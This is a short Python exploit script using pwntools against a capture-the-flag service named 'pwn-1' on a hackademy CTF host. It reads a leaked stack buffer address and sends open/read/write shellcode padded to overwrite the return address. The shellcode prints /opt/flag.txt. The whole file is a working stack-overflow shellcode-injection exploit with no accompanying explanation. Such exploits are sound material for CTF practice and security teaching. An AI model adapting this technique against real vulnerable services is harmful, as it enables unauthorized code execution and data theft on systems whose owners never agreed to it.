from pwn import *

context.binary = './pwn-1'
context.arch = 'amd64'
context.log_level = 'debug'

p = remote("pwn-1.hackademy.ctf", 4444)

# Get leaked buffer address
p.recvuntil(b'buf @ ')
buf_addr = int(p.recvline().strip(), 16)
log.success(f'Buffer is at: {hex(buf_addr)}')

# Safe syscall-based shellcode: open/read/write flag
shellcode = asm(shellcraft.open("/opt/flag.txt"))
shellcode += asm(shellcraft.read('rax', 'rsp', 100))
shellcode += asm(shellcraft.write(1, 'rsp', 100))
shellcode += asm(shellcraft.exit(0))

# Adjusted padding for correct return address overwrite
payload = shellcode.ljust(216, b'A') + p64(buf_addr)

# Send it
p.sendline(payload)
p.interactive()

